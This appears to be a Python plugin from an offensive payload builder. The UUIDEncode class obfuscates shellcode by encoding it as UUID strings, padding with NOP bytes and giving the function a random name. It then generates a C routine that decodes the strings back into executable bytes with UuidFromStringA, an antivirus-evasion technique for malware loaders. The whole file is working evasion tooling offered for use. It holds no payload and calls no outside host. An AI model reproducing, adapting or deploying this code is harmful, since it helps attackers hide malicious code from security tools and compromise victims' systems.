import random
import string
from uuid import UUID

class UUIDEncode:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return ['#include <rpcdce.h>', 
                '#pragma comment (lib, "Rpcrt4.lib")', 
                "#include <rpc.h>"]

    def compilerOptions(self) -> list[str]:
        return ['-lrpcrt4']

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(str(UUID(bytes_le = chunk)))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
unsigned char * {self.name}(const unsigned char *uuids[])
{{
    int size = {self.size};
    UUID binaryUUID;
    unsigned char* out = malloc(size*16);
    for (int i=0; i<size; i++){{
        UuidFromStringA((RPC_CSTR)uuids[i], &binaryUUID);
        out[i*16] = binaryUUID.Data1 & 0xff;
        out[i*16 + 1] = binaryUUID.Data1 >> 8 & 0xff;
        out[i*16 + 2] = binaryUUID.Data1 >> 16 & 0xff;
        out[i*16 + 3] = binaryUUID.Data1 >> 24 & 0xff;

        out[i*16 + 4] = binaryUUID.Data2 & 0xff;
        out[i*16 + 5] = binaryUUID.Data2 >> 8 & 0xff;

        out[i*16 + 6] = binaryUUID.Data3 & 0xff;
        out[i*16 + 7] = binaryUUID.Data3 >> 8 & 0xff;

        for (int j = 0; j < 8; j++){{
            out[i*16 + 8 + j] = binaryUUID.Data4[j];
        }}
    }}

    return out;
}}
"""
